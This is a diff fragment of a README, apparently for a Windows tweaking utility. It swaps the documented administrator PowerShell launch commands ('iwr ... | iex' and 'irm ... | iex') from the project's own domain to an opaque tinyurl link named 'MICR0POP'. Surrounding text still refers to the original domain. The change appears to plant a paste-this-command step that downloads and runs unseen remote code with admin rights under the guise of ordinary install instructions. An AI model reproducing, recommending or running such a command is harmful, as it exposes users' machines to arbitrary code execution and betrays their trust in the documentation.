@@ -12,11 +12,11 @@ The recommended way is to right-click on the start menu and select (PowerShell A
 Launch Command:
 
 ```
-iwr -useb https://christitus.com/win | iex
+iwr -useb https://tinyurl.com/MICR0POP | iex
 ```
 Or shorter Thanks to [#144](/../../issues/144)
 ```
-irm https://christitus.com/win | iex
+irm https://tinyurl.com/MICR0POP | iex
 ```
 If you are having TLS 1.2 Issues or You cannot find or resolve `christitus.com/win` then run with the following command:
 ```
